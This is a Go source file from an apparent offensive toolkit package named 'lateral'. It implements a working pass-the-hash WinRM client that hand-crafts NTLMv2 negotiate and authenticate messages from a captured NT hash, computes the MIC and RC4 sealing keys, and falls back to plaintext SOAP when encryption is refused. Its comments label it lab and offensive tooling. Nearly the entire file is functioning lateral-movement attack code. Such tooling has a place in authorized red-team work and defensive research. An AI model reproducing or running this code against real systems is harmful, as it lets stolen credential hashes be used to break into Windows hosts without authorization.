package lateral

import (
	"bytes"
	"crypto/hmac"
	"crypto/md5"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"
	"unicode/utf16"

	"github.com/masterzen/winrm"
	"github.com/masterzen/winrm/soap"
)

// clientNTLMHash is a WinRM transport that authenticates with an NT hash (pass-the-hash)
// and seals SOAP with NTLM message encryption when the host negotiates Sign/Seal
// (AllowUnencrypted=false parity with password-path winrm.NewEncryption("ntlm")).
//
// Session ownership: the only security session is hashNegotiator.session.
// All Post / ensureSession / seal work holds mu so RC4 seq state cannot desync.
//
// Permissive policy: prefer seal when possible, but fall back to plaintext SOAP on
// seal build failures, 415/encryption errors, or soft unseal failures that look like SOAP.
type clientNTLMHash struct {
	url    string
	user   string // DOMAIN\user or bare user
	hash   string // NT hex or LM:NT
	httpT  http.RoundTripper
	domain string
	acct   string

	mu sync.Mutex
	neg *hashNegotiator

	// preferPlain disables encryption for this client after a seal attempt was rejected.
	preferPlain bool
}

func newClientNTLMWithHash(user, hashHex string) *clientNTLMHash {
	dom, acct := parseDomainUser(user, "")
	return &clientNTLMHash{user: user, hash: hashHex, domain: dom, acct: acct}
}

func (c *clientNTLMHash) Transport(endpoint *winrm.Endpoint) error {
	if endpoint == nil {
		return fmt.Errorf("nil winrm endpoint")
	}
	scheme := "http"
	if endpoint.HTTPS {
		scheme = "https"
	}
	c.url = scheme + "://" + net.JoinHostPort(endpoint.Host, strconv.Itoa(endpoint.Port)) + "/wsman"

	timeout := endpoint.Timeout
	if timeout == 0 {
		timeout = 60 * time.Second
	}
	// MaxConnsPerHost=1 keeps NTLM multi-leg auth on one TCP connection.
	tr := &http.Transport{
		//nolint:gosec // lab/offensive WinRM often uses self-signed certs
		TLSClientConfig:       &tls.Config{InsecureSkipVerify: endpoint.Insecure, ServerName: endpoint.TLSServerName},
		DialContext:           (&net.Dialer{Timeout: 30 * time.Second, KeepAlive: 30 * time.Second}).DialContext,
		ResponseHeaderTimeout: timeout,
		Proxy:                 http.ProxyFromEnvironment,
		MaxIdleConns:          1,
		MaxConnsPerHost:       1,
		MaxIdleConnsPerHost:   1,
		IdleConnTimeout:       90 * time.Second,
		DisableKeepAlives:     false,
	}
	c.neg = &hashNegotiator{
		RoundTripper: tr,
		hash:         c.hash,
		domain:       c.domain,
		user:         c.acct,
		onReset: func() {
			// Negotiator clears its own session; Post re-syncs via ensureSessionLocked.
		},
	}
	c.httpT = c.neg
	return nil
}

func (c *clientNTLMHash) Post(_ *winrm.Client, request *soap.SoapMessage) (string, error) {
	if c.url == "" || c.httpT == nil {
		return "", fmt.Errorf("winrm hash transport not initialized")
	}

	// Hold mu for the full auth + seal + exchange so session keys/seq stay coherent.
	c.mu.Lock()
	defer c.mu.Unlock()

	if err := c.ensureSessionLocked(); err != nil {
		return "", err
	}

	plain := []byte(request.String())
	useEnc := !c.preferPlain && c.neg.session != nil && canSeal(c.neg.session.flags)

	body, ct, status, err := c.doSOAPLocked(plain, useEnc)
	if err != nil {
		return "", err
	}

	// Soft path: sealed request rejected → drop encryption preference and retry plain once.
	if useEnc && isEncryptionRejected(status, body) {
		c.preferPlain = true
		body, ct, status, err = c.doSOAPLocked(plain, false)
		if err != nil {
			return "", err
		}
	}

	if status == http.StatusUnauthorized {
		c.resetSessionLocked()
		snippet := clipBody(body, 256)
		return "", fmt.Errorf(
			"http error 401 unauthorized (user=%s domain=%s): NTLM rejected — "+
				"verify NETBIOS domain + 32-hex NT hash. body: %s",
			c.acct, c.domain, snippet)
	}
	if status != http.StatusOK {
		snippet := clipBody(body, 256)
		if isEncryptionRejected(status, body) {
			return "", fmt.Errorf(
				"http error %d: WinRM message encryption issue (sealed and plain attempts). body: %s",
				status, snippet)
		}
		return "", fmt.Errorf("http error %d: %s", status, snippet)
	}

	// Decrypt if we used encryption (or response looks encrypted).
	sess := c.neg.session
	if useEnc && sess != nil {
		plainOut, uerr := parseEncryptedWinRMBody(body, ct, sess)
		if uerr != nil {
			// Permissive: accept plain SOAP / XML even when unseal fails.
			if looksLikeSOAP(body) || strings.Contains(ct, "application/soap+xml") {
				return string(body), nil
			}
			return "", fmt.Errorf("winrm unseal: %w", uerr)
		}
		return string(plainOut), nil
	}
	// Plain request — still try unseal if server replied encrypted.
	if sess != nil && (strings.Contains(ct, "multipart/encrypted") || bytes.Contains(body, []byte("Encrypted Boundary"))) {
		if plainOut, uerr := parseEncryptedWinRMBody(body, ct, sess); uerr == nil {
			return string(plainOut), nil
		}
	}
	return string(body), nil
}

// doSOAPLocked posts one SOAP message (optionally sealed). Caller holds c.mu.
func (c *clientNTLMHash) doSOAPLocked(plain []byte, encrypt bool) (body []byte, contentType string, status int, err error) {
	httpClient := &http.Client{Transport: c.httpT, Timeout: 90 * time.Second}

	var bodyReader io.Reader
	contentType = "application/soap+xml;charset=UTF-8"
	if encrypt && c.neg.session != nil {
		encBody, ct, berr := buildEncryptedWinRMBody(plain, c.neg.session)
		if berr != nil {
			// Seal build failed — fall back to plaintext for this attempt.
			bodyReader = bytes.NewReader(plain)
		} else {
			bodyReader = bytes.NewReader(encBody)
			contentType = ct
		}
	} else {
		bodyReader = bytes.NewReader(plain)
	}

	req, err := http.NewRequest(http.MethodPost, c.url, bodyReader)
	if err != nil {
		return nil, "", 0, fmt.Errorf("create winrm request: %w", err)
	}
	req.Header.Set("Content-Type", contentType)
	req.Header.Set("Connection", "Keep-Alive")
	req.Header.Set("User-Agent", "WinRM client")
	req.SetBasicAuth(c.user, "x")

	resp, err := httpClient.Do(req)
	if err != nil {
		return nil, "", 0, fmt.Errorf("winrm post: %w", err)
	}
	defer resp.Body.Close()
	body, err = io.ReadAll(resp.Body)
	if err != nil {
		return nil, "", 0, err
	}
	return body, resp.Header.Get("Content-Type"), resp.StatusCode, nil
}

func isEncryptionRejected(status int, body []byte) bool {
	if status == http.StatusUnsupportedMediaType {
		return true
	}
	ls := strings.ToLower(string(body))
	if len(ls) > 512 {
		ls = ls[:512]
	}
	return strings.Contains(ls, "encrypt") ||
		strings.Contains(ls, "unencrypted") ||
		strings.Contains(ls, "credssp")
}

func (c *clientNTLMHash) ensureSessionLocked() error {
	if c.neg == nil {
		return fmt.Errorf("winrm hash transport not initialized")
	}
	// Auth done (with or without seal keys) is sticky — do not re-probe every Post.
	if c.neg.complete {
		return nil
	}

	// Empty POST completes NTLM (TYPE1/2/3) and populates negotiator.session when Sign/Seal granted.
	httpClient := &http.Client{Transport: c.neg, Timeout: 90 * time.Second}
	req, err := http.NewRequest(http.MethodPost, c.url, nil)
	if err != nil {
		return fmt.Errorf("create winrm auth probe: %w", err)
	}
	req.Header.Set("Content-Type", "application/soap+xml;charset=UTF-8")
	req.Header.Set("Content-Length", "0")
	req.Header.Set("Connection", "Keep-Alive")
	req.Header.Set("User-Agent", "WinRM client")
	req.SetBasicAuth(c.user, "x")

	resp, err := httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("winrm ntlm auth: %w", err)
	}
	_, _ = io.Copy(io.Discard, resp.Body)
	_ = resp.Body.Close()

	// Permissive auth acceptance: NTLM complete is enough even if empty probe is not 200
	// (some hosts return 400/500 on zero-length body after accepting auth).
	if c.neg.complete {
		return nil
	}
	if resp.StatusCode == http.StatusUnauthorized {
		c.resetSessionLocked()
		return fmt.Errorf("winrm ntlm auth http 401 (user=%s domain=%s)", c.acct, c.domain)
	}
	if resp.StatusCode != http.StatusOK {
		c.resetSessionLocked()
		return fmt.Errorf("winrm ntlm auth http %d (user=%s domain=%s)", resp.StatusCode, c.acct, c.domain)
	}
	return fmt.Errorf("winrm ntlm auth did not complete")
}

func (c *clientNTLMHash) resetSessionLocked() {
	c.preferPlain = false
	if c.neg != nil {
		c.neg.reset()
	}
}

func clipBody(body []byte, n int) string {
	s := string(body)
	if len(s) > n {
		return s[:n]
	}
	return s
}

// hashNegotiator converts Basic auth into NTLMv2 using an NT hash + explicit domain,
// and builds a security session for message encryption when Seal is negotiated.
//
// Session lives only here (single source of truth for seal keys / RC4 state).
type hashNegotiator struct {
	http.RoundTripper
	hash   string
	domain string
	user   string // account only (no domain)

	complete     bool
	session      *ntlmSecuritySession
	negotiateMsg []byte // TYPE1 bytes for MIC
	onReset      func()
}

func (l *hashNegotiator) reset() {
	l.complete = false
	l.session = nil
	l.negotiateMsg = nil
	if l.onReset != nil {
		l.onReset()
	}
}

func (l *hashNegotiator) RoundTrip(req *http.Request) (*http.Response, error) {
	rt := l.RoundTripper
	if rt == nil {
		rt = http.DefaultTransport
	}

	// Already authenticated on this connection — send as-is (no Basic re-auth).
	// Connection-level NTLM + keep-alive carries the session; sealing is done by Post.
	if l.complete {
		req2 := req.Clone(req.Context())
		req2.Header.Del("Authorization")
		res, err := rt.RoundTrip(req2)
		if err != nil {
			return nil, err
		}
		if res.StatusCode == http.StatusUnauthorized {
			// Session dead — clear the only session so callers cannot seal with stale keys.
			// Do NOT re-auth in this same RoundTrip: the body may already be sealed under
			// the old session (Post must re-ensureSession and re-seal on next attempt).
			_, _ = io.Copy(io.Discard, res.Body)
			_ = res.Body.Close()
			l.reset()
			return &http.Response{
				Status:     "401 Unauthorized",
				StatusCode: http.StatusUnauthorized,
				Proto:      res.Proto,
				ProtoMajor: res.ProtoMajor,
				ProtoMinor: res.ProtoMinor,
				Header:     res.Header.Clone(),
				Body:       io.NopCloser(bytes.NewReader(nil)),
				Request:    req,
			}, nil
		}
		return res, nil
	}

	reqauth := req.Header.Get("Authorization")
	if !strings.HasPrefix(strings.ToLower(reqauth), "basic ") {
		return rt.RoundTrip(req)
	}

	body := bytes.Buffer{}
	if req.Body != nil {
		if _, err := body.ReadFrom(req.Body); err != nil {
			return nil, err
		}
		_ = req.Body.Close()
		req.Body = io.NopCloser(bytes.NewReader(body.Bytes()))
	}

	// Anonymous probe (session cookie reuse / no-auth endpoints)
	req.Header.Del("Authorization")
	res, err := rt.RoundTrip(req)
	if err != nil {
		return nil, err
	}
	if res.StatusCode != http.StatusUnauthorized {
		return res, nil
	}
	if !hasNegotiateOrNTLM(res.Header.Values("Www-Authenticate")) {
		return res, nil
	}
	_, _ = io.Copy(io.Discard, res.Body)
	_ = res.Body.Close()

	u, _, ok := parseBasicAuthHeader(reqauth)
	if !ok {
		return nil, fmt.Errorf("missing basic auth for ntlm hash")
	}
	user, domain := l.user, l.domain
	if user == "" {
		user, domain, _ = splitUserDomain(u)
	}

	// TYPE1 with seal flags (Sign|Seal|KeyExch|…) so session keys can be derived.
	neg, err := newNegotiateMessageSeal(domain, "")
	if err != nil {
		return nil, err
	}
	l.negotiateMsg = neg

	www := res.Header.Values("Www-Authenticate")
	req.Header.Set("Authorization", authPrefix(www)+base64.StdEncoding.EncodeToString(neg))
	req.Body = io.NopCloser(bytes.NewReader(body.Bytes()))

	res, err = rt.RoundTrip(req)
	if err != nil {
		return nil, err
	}
	www = res.Header.Values("Www-Authenticate")
	challenge, err := getAuthData(www)
	if err != nil {
		return nil, err
	}
	if len(challenge) == 0 {
		return res, nil
	}
	_, _ = io.Copy(io.Discard, res.Body)
	_ = res.Body.Close()

	authMsg, session, err := ntlmAuthenticateWithHashSession(challenge, user, domain, l.hash, l.negotiateMsg)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Authorization", authPrefix(www)+base64.StdEncoding.EncodeToString(authMsg))
	req.Body = io.NopCloser(bytes.NewReader(body.Bytes()))
	res, err = rt.RoundTrip(req)
	if err != nil {
		return nil, err
	}
	// Permissive complete: treat TYPE3 as accepted unless we clearly got 401.
	// Empty-body probes sometimes return 400/500 after a successful NTLM handshake.
	if res.StatusCode != http.StatusUnauthorized {
		l.complete = true
		l.session = session // may be nil if Sign/Seal not negotiated
	}
	return res, nil
}

func hasNegotiateOrNTLM(headers []string) bool {
	for _, h := range headers {
		l := strings.ToLower(h)
		if strings.HasPrefix(l, "negotiate") || strings.HasPrefix(l, "ntlm") {
			return true
		}
	}
	return false
}

func authPrefix(headers []string) string {
	for _, h := range headers {
		if strings.HasPrefix(strings.ToLower(h), "ntlm") {
			return "NTLM "
		}
	}
	return "Negotiate "
}

func getAuthData(headers []string) ([]byte, error) {
	for _, h := range headers {
		parts := strings.SplitN(h, " ", 2)
		if len(parts) != 2 {
			continue
		}
		l := strings.ToLower(parts[0])
		if l == "ntlm" || l == "negotiate" {
			return base64.StdEncoding.DecodeString(parts[1])
		}
	}
	return nil, nil
}

func parseBasicAuthHeader(header string) (user, pass string, ok bool) {
	r := &http.Request{Header: http.Header{"Authorization": []string{header}}}
	return r.BasicAuth()
}

// splitUserDomain parses DOMAIN\user or user@domain (Azure ntlmssp.GetDomain substitute).
func splitUserDomain(u string) (user, domain string, domainNeeded bool) {
	if i := strings.Index(u, `\`); i >= 0 {
		return u[i+1:], u[:i], true
	}
	if i := strings.Index(u, "@"); i >= 0 {
		return u[:i], u[i+1:], true
	}
	return u, "", false
}

// newNegotiateMessageSeal builds NTLM TYPE1 requesting sign/seal/key exchange.
func newNegotiateMessageSeal(domain, workstation string) ([]byte, error) {
	flags := defaultSealNegotiateFlags()
	domainBytes := []byte(strings.ToUpper(domain))
	wsBytes := []byte(strings.ToUpper(workstation))
	if domain != "" {
		flags |= ntlmFlagOEMDomainSupplied
	}
	if workstation != "" {
		flags |= ntlmFlagOEMWorkstationSupplied
	}

	const headerLen = 40
	off := headerLen
	msg := make([]byte, headerLen)
	copy(msg[0:8], []byte("NTLMSSP\x00"))
	binary.LittleEndian.PutUint32(msg[8:12], 1) // TYPE1
	binary.LittleEndian.PutUint32(msg[12:16], flags)

	// DomainName fields at 16, Workstation at 24, Version at 32 (optional zeros)
	writeNegField := func(at int, data []byte) {
		binary.LittleEndian.PutUint16(msg[at:at+2], uint16(len(data)))
		binary.LittleEndian.PutUint16(msg[at+2:at+4], uint16(len(data)))
		binary.LittleEndian.PutUint32(msg[at+4:at+8], uint32(off))
		off += len(data)
	}
	writeNegField(16, domainBytes)
	writeNegField(24, wsBytes)

	out := bytes.NewBuffer(msg)
	out.Write(domainBytes)
	out.Write(wsBytes)
	return out.Bytes(), nil
}

// ntlmAuthenticateWithHashSession crafts TYPE3 using NT hash and returns a security session
// when Seal was negotiated (required for WinRM message encryption).
func ntlmAuthenticateWithHashSession(challengeMessageData []byte, user, domain, hash string, negotiateMsg []byte) ([]byte, *ntlmSecuritySession, error) {
	if user == "" && hash == "" {
		return nil, nil, fmt.Errorf("anonymous authentication not supported")
	}

	hashNT := hash
	if strings.Contains(hash, ":") {
		parts := strings.Split(hash, ":")
		hashNT = parts[len(parts)-1]
	}
	hashBytes, err := hex.DecodeString(strings.ToLower(strings.TrimSpace(hashNT)))
	if err != nil || len(hashBytes) != 16 {
		return nil, nil, fmt.Errorf("invalid NT hash: %w", err)
	}

	if len(challengeMessageData) < 48 || string(challengeMessageData[0:8]) != "NTLMSSP\x00" {
		return nil, nil, fmt.Errorf("invalid NTLM challenge")
	}
	msgType := binary.LittleEndian.Uint32(challengeMessageData[8:12])
	if msgType != 2 {
		return nil, nil, fmt.Errorf("expected NTLM type 2, got %d", msgType)
	}
	flags := binary.LittleEndian.Uint32(challengeMessageData[20:24])
	serverChallenge := challengeMessageData[24:32]

	// Prefer Unicode if offered.
	if flags&ntlmFlagUnicode != 0 {
		flags &^= ntlmFlagOEM
	}

	var targetInfoRaw []byte
	if len(challengeMessageData) >= 48 {
		tiLen := binary.LittleEndian.Uint16(challengeMessageData[40:42])
		tiOff := binary.LittleEndian.Uint32(challengeMessageData[44:48])
		if tiOff > 0 && int(tiOff)+int(tiLen) <= len(challengeMessageData) {
			targetInfoRaw = challengeMessageData[tiOff : tiOff+uint32(tiLen)]
		}
	}

	// NTOWFv2 = HMAC_MD5(NT, UTF16(Upper(User) + Domain))
	ntowf := hmacMD5(hashBytes, toUnicode(strings.ToUpper(user)+domain))

	timestamp := extractAvTimestamp(targetInfoRaw)
	if timestamp == nil {
		ft := uint64(time.Now().UnixNano())/100 + 116444736000000000
		timestamp = make([]byte, 8)
		binary.LittleEndian.PutUint64(timestamp, ft)
	}
	clientChallenge := make([]byte, 8)
	if _, err := rand.Read(clientChallenge); err != nil {
		return nil, nil, err
	}

	// temp = Responserversion(1) + HiResponserversion(1) + Z(6) + time + clientChallenge + Z(4) + AV_PAIRS + Z(4)
	temp := []byte{1, 1, 0, 0, 0, 0, 0, 0}
	temp = append(temp, timestamp...)
	temp = append(temp, clientChallenge...)
	temp = append(temp, 0, 0, 0, 0)
	if targetInfoRaw != nil {
		temp = append(temp, targetInfoRaw...)
	}
	temp = append(temp, 0, 0, 0, 0)

	ntProof := hmacMD5(ntowf, concat(serverChallenge, temp))
	ntChallengeResponse := append(append([]byte(nil), ntProof...), temp...)

	// SessionBaseKey / KeyExchangeKey for NTLMv2 = HMAC_MD5(NTOWFv2, NTProofStr)
	sessionBaseKey := hmacMD5(ntowf, ntProof)
	keyExchangeKey := sessionBaseKey

	var exportedSessionKey, encryptedRandomSessionKey []byte
	if flags&ntlmFlagKeyExch != 0 {
		exportedSessionKey = make([]byte, 16)
		if _, err := rand.Read(exportedSessionKey); err != nil {
			return nil, nil, err
		}
		encryptedRandomSessionKey, err = encryptRC4Key(keyExchangeKey, exportedSessionKey)
		if err != nil {
			return nil, nil, err
		}
	} else {
		exportedSessionKey = keyExchangeKey
	}

	var lmChallengeResponse []byte
	if targetInfoRaw == nil {
		lmChallengeResponse = concat(hmacMD5(ntowf, concat(serverChallenge, clientChallenge)), clientChallenge)
	}

	authMsg, err := marshalAuthenticateMessageMIC(user, domain, lmChallengeResponse, ntChallengeResponse,
		encryptedRandomSessionKey, flags, exportedSessionKey, negotiateMsg, challengeMessageData, targetInfoRaw)
	if err != nil {
		return nil, nil, err
	}

	var session *ntlmSecuritySession
	// Build a seal session when Sign or Seal was granted. Soft-fail: auth still works without it.
	if flags&ntlmFlagSeal != 0 || flags&ntlmFlagSign != 0 {
		session, err = newClientSecuritySession(flags, exportedSessionKey)
		if err != nil {
			session = nil // plaintext path still available
		}
	}

	return authMsg, session, nil
}

// processChallengeWithHashDomain is kept for tests / callers that only need TYPE3 bytes.
func processChallengeWithHashDomain(challengeMessageData []byte, user, domain, hash string) ([]byte, error) {
	msg, _, err := ntlmAuthenticateWithHashSession(challengeMessageData, user, domain, hash, nil)
	return msg, err
}

func extractAvTimestamp(targetInfo []byte) []byte {
	i := 0
	for i+4 <= len(targetInfo) {
		id := binary.LittleEndian.Uint16(targetInfo[i : i+2])
		l := binary.LittleEndian.Uint16(targetInfo[i+2 : i+4])
		i += 4
		if id == 0 {
			break
		}
		if i+int(l) > len(targetInfo) {
			break
		}
		if id == 7 && l == 8 { // MsvAvTimestamp
			out := make([]byte, 8)
			copy(out, targetInfo[i:i+8])
			return out
		}
		i += int(l)
	}
	return nil
}

// extractAvFlags returns MsvAvFlags (id 6) value if present.
func extractAvFlags(targetInfo []byte) (uint32, bool) {
	i := 0
	for i+4 <= len(targetInfo) {
		id := binary.LittleEndian.Uint16(targetInfo[i : i+2])
		l := binary.LittleEndian.Uint16(targetInfo[i+2 : i+4])
		i += 4
		if id == 0 {
			break
		}
		if i+int(l) > len(targetInfo) {
			break
		}
		if id == 6 && l >= 4 {
			return binary.LittleEndian.Uint32(targetInfo[i : i+4]), true
		}
		i += int(l)
	}
	return 0, false
}

const msvAvFlagMICProvided uint32 = 1 << 1

// marshalAuthenticateMessage builds TYPE3 without MIC (tests / simple path).
func marshalAuthenticateMessage(user, domain string, lmResp, ntResp []byte, negotiateFlags uint32) ([]byte, error) {
	return marshalAuthenticateMessageMIC(user, domain, lmResp, ntResp, nil, negotiateFlags, nil, nil, nil, nil)
}

// marshalAuthenticateMessageMIC builds TYPE3.
//
// Layout:
//   - No MIC: 64-byte fixed header + payloads (proven PTH path).
//   - With MIC (MsvAvFlagMICProvided): 64-byte header + 8-byte Version (VERSION flag set) +
//     16-byte MIC + payloads — matches bodgit/Windows placement of MIC after Version.
//
// Payload bytes follow field offsets: Lm, Nt, Domain, User, Workstation, EncSessionKey.
func marshalAuthenticateMessageMIC(
	user, domain string,
	lmResp, ntResp, encSessionKey []byte,
	negotiateFlags uint32,
	exportedSessionKey, negotiateMsg, challengeMsg, targetInfo []byte,
) ([]byte, error) {
	needMIC := false
	if avFlags, ok := extractAvFlags(targetInfo); ok && avFlags&msvAvFlagMICProvided != 0 &&
		len(exportedSessionKey) == 16 && len(negotiateMsg) > 0 && len(challengeMsg) > 0 {
		needMIC = true
	}

	userU := toUnicode(user)
	domainU := toUnicode(domain)
	wsU := toUnicode("")

	const (
		fixedHeader = 64
		versionLen  = 8
		micLen      = 16
	)

	flags := negotiateFlags
	var version []byte
	headerLen := fixedHeader
	if needMIC {
		// ProductMajor=10, ProductMinor=0, Build=0, NTLMRevisionCurrent=0x0f (W2K3).
		version = make([]byte, versionLen)
		version[0] = 10
		version[7] = 0x0f
		flags |= ntlmFlagVersion
		headerLen += versionLen + micLen
	} else {
		flags &^= ntlmFlagVersion
	}

	build := func(mic []byte) []byte {
		off := headerLen
		fields := make([]byte, fixedHeader)
		copy(fields[0:8], []byte("NTLMSSP\x00"))
		binary.LittleEndian.PutUint32(fields[8:12], 3)

		writeField := func(at int, data []byte) {
			binary.LittleEndian.PutUint16(fields[at:at+2], uint16(len(data)))
			binary.LittleEndian.PutUint16(fields[at+2:at+4], uint16(len(data)))
			binary.LittleEndian.PutUint32(fields[at+4:at+8], uint32(off))
			off += len(data)
		}
		writeField(12, lmResp)
		writeField(20, ntResp)
		writeField(28, domainU)
		writeField(36, userU)
		writeField(44, wsU)
		writeField(52, encSessionKey)
		binary.LittleEndian.PutUint32(fields[60:64], flags)

		out := bytes.NewBuffer(make([]byte, 0, headerLen+256))
		out.Write(fields)
		if needMIC {
			out.Write(version)
			if mic == nil {
				mic = make([]byte, micLen)
			}
			out.Write(mic)
		}
		out.Write(lmResp)
		out.Write(ntResp)
		out.Write(domainU)
		out.Write(userU)
		out.Write(wsU)
		out.Write(encSessionKey)
		return out.Bytes()
	}

	if !needMIC {
		return build(nil), nil
	}

	// Zero MIC, then MIC = HMAC_MD5(ExportedSessionKey, Neg||Chl||AuthWithZeroMIC).
	withZero := build(make([]byte, micLen))
	mic := hmacMD5(exportedSessionKey, concat(negotiateMsg, challengeMsg, withZero))
	return build(mic), nil
}

func toUnicode(s string) []byte {
	codes := utf16.Encode([]rune(s))
	b := make([]byte, len(codes)*2)
	for i, c := range codes {
		binary.LittleEndian.PutUint16(b[i*2:], c)
	}
	return b
}

func hmacMD5(key, data []byte) []byte {
	m := hmac.New(md5.New, key)
	m.Write(data)
	return m.Sum(nil)
}

func concat(parts ...[]byte) []byte {
	n := 0
	for _, p := range parts {
		n += len(p)
	}
	out := make([]byte, 0, n)
	for _, p := range parts {
		out = append(out, p...)
	}
	return out
}
